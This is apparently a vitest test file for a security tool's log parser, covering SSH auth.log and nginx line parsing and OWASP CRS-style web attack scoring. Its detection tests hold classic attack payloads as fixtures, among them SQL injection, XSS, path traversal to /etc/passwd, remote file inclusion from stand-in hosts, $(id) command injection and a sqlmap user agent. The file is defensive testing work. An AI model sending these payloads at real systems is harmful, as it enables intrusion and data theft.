import { afterEach, describe, it, expect } from 'vitest';
import {
  assessNginxRequest,
  attackSeverity,
  configureAttackDetection,
  detectAttackPattern,
  parseAuthLog,
  parseNginxLog,
} from '../log-parser.js';
import type { NginxLogEntry } from '../../types/events.js';

describe('parseAuthLog', () => {
  it('reads the legacy BSD syslog timestamp', () => {
    const entry = parseAuthLog(
      'Sep 25 09:23:31 host sshd[1234]: Failed password for root from 45.33.22.11 port 22 ssh2',
    );
    expect(entry?.fields.process).toBe('sshd');
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.fields.user).toBe('root');
  });

  it('reads the RFC3339 timestamp rsyslog writes by default now', () => {
    // Before this, every line in a modern /var/log/auth.log failed to parse and
    // ssh-guard sat at zero events while SSH was being brute-forced.
    const entry = parseAuthLog(
      '2026-09-25T09:23:31.141344+00:00 host sshd-session[84073]: Failed password for root from 45.33.22.11 port 22 ssh2',
    );
    expect(entry).not.toBeNull();
    expect(entry?.fields.process).toBe('sshd-session');
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.timestamp.getUTCFullYear()).toBe(2026);
    expect(entry?.timestamp.getUTCHours()).toBe(9);
  });

  it('pulls the user out of an invalid-user line', () => {
    const entry = parseAuthLog(
      '2026-09-25T09:23:31.141344+00:00 host sshd-session[1]: Invalid user admin123 from 103.77.88.99 port 5',
    );
    expect(entry?.fields.user).toBe('admin123');
    expect(entry?.fields.ip).toBe('103.77.88.99');
  });

  it('returns null on a line that is not auth-shaped', () => {
    expect(parseAuthLog('this is not a log line')).toBeNull();
  });
});

describe('parseNginxLog', () => {
  const combined =
    '45.33.22.11 - - [25/Sep/2026:09:19:29 +0000] "GET /ring/dnin/previous HTTP/1.1" 402 614 "-" "Mozilla/5.0"';

  it('reads the stock combined format', () => {
    const entry = parseNginxLog(combined);
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.fields.method).toBe('GET');
    expect(entry?.fields.path).toBe('/ring/dnin/previous');
    expect(entry?.fields.status).toBe('402');
    expect(entry?.fields.host).toBeUndefined();
  });

  it('reads a $host-prefixed format and keeps the site', () => {
    const entry = parseNginxLog(`rssamplifier.com ${combined}`);
    expect(entry?.fields.host).toBe('rssamplifier.com');
    expect(entry?.fields.ip).toBe('45.33.22.11');
    expect(entry?.fields.status).toBe('402');
    expect(entry?.fields.path).toBe('/ring/dnin/previous');
  });
});

/** A combined-format line for `request` ("GET /path HTTP/1.1"), with optional Referer and User-Agent. */
function line(request: string, { referer = '-', ua = 'Mozilla/5.0' } = {}): NginxLogEntry {
  const entry = parseNginxLog(`203.0.113.9 - - [25/Sep/2026:09:19:29 +0000] "${request}" 200 614 "${referer}" "${ua}"`);
  if (!entry) throw new Error(`unparseable: ${request}`);
  return entry;
}

describe('web attack detection (OWASP CRS, PL1)', () => {
  afterEach(() => configureAttackDetection(undefined));

  it('does not call a URL in a query parameter an attack', () => {
    // rssamplifier.com serves exactly this shape to ordinary readers. Flagging
    // it CRITICAL meant auto-defence would ban them.
    for (const path of [
      '/rssamplifier/read?p=https://example.com/article',
      '/noticias8islas-com/read?p=https%3A%2F%2Fnoticias8islas.com%2F%3Fp%3D79855',
      '/share?url=https://example.com/post?id=1',
    ]) {
      const assessment = assessNginxRequest(line(`GET ${path} HTTP/2.0`));
      expect(assessment.score, path).toBeLessThan(assessment.threshold);
      expect(attackSeverity(assessment), path).toBeNull();
    }
  });

  it('puts classic attacks at or over the threshold', () => {
    const cases: Array<[string, string]> = [
      ['GET /search?q=1%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1', 'sqli'],
      ['GET /item?id=1+AND+SLEEP(5) HTTP/1.1', 'sqli'],
      ['GET /x?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1', 'xss'],
      ['GET /x?q=<img%20src=x%20onerror=alert(1)> HTTP/1.1', 'xss'],
      ['GET /download?file=../../../../etc/passwd HTTP/1.1', 'path_traversal'],
      ['GET /index.php?page=http://192.0.2.7/shell.txt HTTP/1.1', 'rfi'],
      ['GET /index.php?page=http://evil.example/shell.txt? HTTP/1.1', 'rfi'],
      ['GET /x?c=$(id) HTTP/1.1', 'rce'],
      ['GET /?f=php://input HTTP/1.1', 'php_injection'],
    ];
    for (const [request, type] of cases) {
      const assessment = assessNginxRequest(line(request));
      expect(assessment.score, request).toBeGreaterThanOrEqual(assessment.threshold);
      expect(assessment.attackType, request).toBe(type);
      expect(attackSeverity(assessment), request).not.toBeNull();
    }
  });

  it('reads the User-Agent and Referer, not just the request line', () => {
    expect(assessNginxRequest(line('GET / HTTP/1.1', { ua: 'sqlmap/1.7.2#stable (https://sqlmap.org)' })).attackType).toBe('scanner');
    const viaReferer = assessNginxRequest(line('GET / HTTP/1.1', { referer: 'https://x.example/?q=<script>alert(1)</script>' }));
    expect(attackSeverity(viaReferer)).not.toBeNull();
    // nginx logs an absent header as "-"; that is not a value to inspect.
    expect(assessNginxRequest(line('GET / HTTP/1.1', { referer: '-', ua: '-' })).score).toBe(0);
  });

  it('sees a quote nginx logged as \\x22', () => {
    // 942540 needs the quote itself; without undoing nginx's escaping it
    // would only ever see the four characters `\x22`.
    expect(assessNginxRequest(line('GET /?q=x\\x22; HTTP/1.1')).matches.map((m) => m.id)).toContain(942540);
    expect(assessNginxRequest(line('GET /?q=x; HTTP/1.1')).score).toBe(0);
  });

  it('scores one CRITICAL rule as high and two or more as critical', () => {
    const one = assessNginxRequest(line('GET /?f=php://input HTTP/1.1'));
    expect(one.score).toBe(5);
    expect(attackSeverity(one)).toBe('high');
    const several = assessNginxRequest(line('GET /download?file=../../../../etc/passwd HTTP/1.1'));
    expect(several.score).toBeGreaterThanOrEqual(10);
    expect(attackSeverity(several)).toBe('critical');
  });

  it('honours [detection] threshold and rule exclusions', () => {
    configureAttackDetection({ anomaly_threshold: 10 });
    const one = assessNginxRequest(line('GET /?f=php://input HTTP/1.1'));
    expect(one.score).toBe(5);
    expect(attackSeverity(one)).toBeNull();

    configureAttackDetection({ exclude_rules: [933140] });
    expect(assessNginxRequest(line('GET /?f=php://input HTTP/1.1')).score).toBe(0);
  });

  it('keeps detectAttackPattern answering with the attack type', () => {
    expect(detectAttackPattern('/../../etc/passwd')).toBe('path_traversal');
    expect(detectAttackPattern('/topics/rochester/podcasts.rss')).toBeNull();
    expect(detectAttackPattern('/~anthony/blog/139-post.html')).toBeNull();
  });
});
